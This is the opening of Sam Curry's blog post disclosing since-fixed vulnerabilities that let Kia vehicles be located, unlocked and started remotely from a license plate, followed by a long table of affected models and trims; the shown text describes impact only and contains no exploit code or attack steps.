---
source: sam-curry
source_url: https://samcurry.net/hacking-kia
title: "Hacking Kia: Remotely Controlling Cars With Just a License Plate"
author: "Sam Curry"
published: 2024-09-20T00:00:00.000Z
description: "On June 11th, 2024, we discovered a set of vulnerabilities in Kia vehicles that allowed remote control over key functions using only a license plate. These attacks could be executed remotely on any hardware-equipped vehicle in about 30 seconds, regardless of whether it had an active Kia Connect subscription."
---

[Back to blog](https://samcurry.net/)

# Hacking Kia: Remotely Controlling Cars With Just a License Plate

September 20, 2024

![Hacking Kia: Remotely Controlling Cars With Just a License Plate](https://samcurry.net/_next/image?url=%2Fimages%2Fhacking-kia%2Fzlz.webp&w=3840&q=75)

## Introduction

On June 11th, 2024, we discovered a set of vulnerabilities in Kia vehicles that allowed remote control over key functions using only a license plate. These attacks could be executed remotely on any hardware-equipped vehicle in about 30 seconds, regardless of whether it had an active Kia Connect subscription.

Additionally, an attacker could silently obtain personal information, including the victim's name, phone number, email address, and physical address. This would allow the attacker to add themselves as an invisible second user on the victim's vehicle without their knowledge.

Remotely Unlocking any Kia with Just a License Plate (Kiatool Demo) - YouTube

Tap to unmute

[Remotely Unlocking any Kia with Just a License Plate (Kiatool Demo)](https://www.youtube.com/watch?v=jMHFCpQdZyg) [Sam Curry](https://www.youtube.com/channel/UC3raaHRLbOIG6r-TEKyVa_g)

![thumbnail-image](https://yt3.ggpht.com/ytc/AIdro_n3zSO5hY0Ih0hGiswPyvVeiObravzACVXkQ6CVSkpARbM=s68-c-k-c0x00ffffff-no-rj)

Sam Curry760 subscribers

[Watch on](https://www.youtube.com/watch?v=jMHFCpQdZyg)

We built a tool to demonstrate the impact of these vulnerabilities where an attacker could simply (1) enter the license plate of a Kia vehicle, then (2) execute commands on the vehicle after around 30 seconds. **These vulnerabilities have since been fixed, this tool was never released, and the Kia team has validated this was never exploited maliciously.**

### Vehicles Affected

Select Year202520242023202220212020201920182017201620152014

Select Model

Select Trim

| Vehicle | Geolocate Vehicle | Remote Lock/Unlock | Remote Start/Stop | Remote Horn/Light | Remote Camera |
| --- | --- | --- | --- | --- | --- |
| 2025 CARNIVAL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 CARNIVAL SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 CARNIVAL LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 CARNIVAL LXS | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 CARNIVAL SX PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 CARNIVAL HYBRID SX PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 CARNIVAL HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 CARNIVAL HYBRID LXS | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 CARNIVAL HYBRID SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 K5 EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 K5 GT | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 K5 GT (GT1 PKG) | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 K5 GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 K5 GT-LINE (PREMIUM PKG) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 K5 LXS | ✅️ | ✅️ | ❌ | ✅️ | ❌ |
| 2025 SELTOS EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SELTOS S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SELTOS SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SELTOS X-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SORENTO PHEV SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SORENTO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SORENTO LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SOUL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SOUL GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SOUL S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SORENTO HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SORENTO HYBRID SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE X-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE X-PRO | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE X-PRO PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE HYBRID SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2025 SPORTAGE PHEV X-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2025 SPORTAGE PHEV X-LINE PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 CARNIVAL SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 CARNIVAL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 CARNIVAL SX PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV6 GT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV6 GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV6 LIGHT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV6 WIND | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV9 LAND | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV9 GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV9 LIGHT LR | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV9 LIGHT SR | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 EV9 WIND | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 FORTE GT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 FORTE GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 K5 EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 K5 GT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 K5 GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO EX TOURING | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO SX TOURING | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO PHEV SX TOURING | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SELTOS EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SELTOS SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SELTOS S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SELTOS SX (SUNROOF PKG) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SELTOS X-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO EV WAVE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 NIRO EV WIND | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SORENTO X-LINE EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO LX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO S | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO X-LINE SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO X-LINE SX-P | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO HYBRID SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SORENTO HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SORENTO PHEV SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SOUL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SOUL GT-Line | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SOUL S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SPORTAGE EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SPORTAGE SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SPORTAGE X-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SPORTAGE SX-P | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SPORTAGE X-PRO | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SPORTAGE X-PRO PRST | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SPORTAGE HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 SPORTAGE HYBRID SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2024 TELLURIDE SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE X-LINE EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE X-LINE SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE X-LINE SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE X-PRO SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 TELLURIDE X-PRO SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2024 SPORTAGE PHEV X-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 CARNIVAL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 CARNIVAL SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 CARNIVAL SX Prestige | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 EV6 GT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 EV6 GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 EV6 LIGHT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 EV6 WIND | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 K5 EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 K5 GT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 K5 GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 FORTE GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 FORTE SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO SX Touring | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO TOURING | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO TOURING SE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO EX Touring | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SELTOS Nightfall | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SELTOS EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SELTOS SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SELTOS S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SORENTO EX SPORT | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SORENTO SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SORENTO S | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SORENTO SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SORENTO X-LINE EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SORENTO X-LINE SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SORENTO X-LINE S | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 NIRO EV WAVE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO EV WIND | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 NIRO PHEV SX TOURING | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 RIO S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SORENTO HYBRID SX-P | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SORENTO HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SOUL GT-Line | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SOUL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SOUL S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 SORENTO PHEV SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE X-Line | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE SX-Prestige | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE X-Pro Prestige | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE X-Pro | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE PHEV X-Line Prestige | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE PHEV X-Line | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 SPORTAGE HYBRID SX-Prestige | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 TELLURIDE LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 TELLURIDE EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 TELLURIDE X-PRO SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 TELLURIDE SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 TELLURIDE SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 TELLURIDE X-LINE EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 TELLURIDE X-PRO SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 TELLURIDE X-LINE SX-PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2023 STINGER GT-Line | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2023 STINGER GT2 | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 EV6 GT-Line | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 EV6 GT-Line (1st Edition) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 EV6 LIGHT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 EV6 WIND | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 EV6 WIND (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 CARNIVAL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 CARNIVAL SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 CARNIVAL SX PRESTIGE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 FORTE GT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 FORTE GT-Line (Premium) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 FORTE GT (GT2) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 FORTE GT (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 FORTE GT-Line | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 FORTE GT-Line (Sport Premium) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 FORTE GT-Line (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 GL-Line Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 EX (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 GT | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 GT (GT1 Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 GT-Line (AWD) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 K5 GT-Line (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO Touring Special Edition | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO EV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO EV EX (Display) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO EV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO EV S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO PHEV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 NIRO PHEV LXS | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 RIO S (4D/Tech. Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 RIO S (5D/Tech. Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SELTOS EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SELTOS Nightfall | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SELTOS S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SELTOS SX Turbo | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SELTOS SX Turbo (Sunroof) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SORENTO EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO S | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO SX Prestige | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO X-Line EX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO X-Line S | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO X-Line SX Prestige | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO HYBRID S | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO HYBRID EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SPORTAGE EX (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SPORTAGE Nightfall (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SPORTAGE SX Turbo | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SORENTO PHEV SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SORENTO PHEV SX-P | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 SOUL EXCLAIM | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SOUL GT-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SOUL X-LINE | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 SOUL S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 STINGER GT-Line | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 STINGER GT1 (Special Edition) | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 STINGER GT-Line (Sun & Sound) | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 STINGER GT1 | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 STINGER GT2 | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 STINGER GT2 (Special Edition) | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2022 TELLURIDE EX (Black Ed, Prem. Pkg, Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE EX (Black Ed, Prem. Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE EX (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE EX (Premium + Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE EX (Std) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE EX (Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE LX (Std) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE SX (Black Ed, Prestige Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE S (Std) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE SX (Black Ed) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE SX (Black Ed, Prestige + Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE SX (Prestige + Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE SX (Prestige Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE SX (Std) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2022 TELLURIDE SX (Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 FORTE EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 FORTE GT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2021 FORTE GT (Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2021 FORTE GT-Line (Premium) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2021 K5 EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 K5 GT (GT1 Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 K5 EX (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 K5 GT-Line | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 K5 GT-Line (Special Ed.) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 K5 LXS (AWD) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 NIRO EV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 NIRO EV EX PREMIUM | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 NIRO EX PREMIUM | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 NIRO TOURING | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 NIRO TOURING SPECIAL EDITION | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SEDONA EX | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2021 SEDONA SX | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2021 SEDONA EX (Premium Pkg) | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2021 NIRO PHEV EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 NIRO PHEV LXS | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 NIRO PHEV EX Premium | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 RIO S (4D/Tech. Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2021 SELTOS SX Turbo | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SELTOS SX Turbo (Sunroof) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SORENTO SX | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2021 SORENTO EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SORENTO EX (Pano Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SORENTO S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SORENTO S (Pano Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SORENTO SX-P | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2021 SORENTO SX-P (X-Line) | ✅️ | ✅️ | ✅️ | ✅️ | ✅️ |
| 2021 SOUL EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SOUL Turbo | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 STINGER GT-Line (Sun & Sound Pkg) | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2021 STINGER GT | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2021 STINGER GT-Line | ❌ | ❌ | ❌ | ❌ | ❌ |
| 2021 STINGER GT1 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2021 STINGER GT2 | ✅️ | ❌ | ❌ | ❌ | ❌ |
| 2021 SPORTAGE EX (Technology Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SPORTAGE S (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 SPORTAGE SX Turbo | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE EX (Black Ed, Prem. Pkg, Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE EX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE EX (Premium + Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE EX (Premium Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX (Black Ed, Prestige Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE EX (Towing Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX (Black Ed, Tow Pkg) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE LX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE S | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
| 2021 TELLURIDE SX (Black Ed) | ✅️ | ✅️ | ✅️ | ✅️ | ❌ |
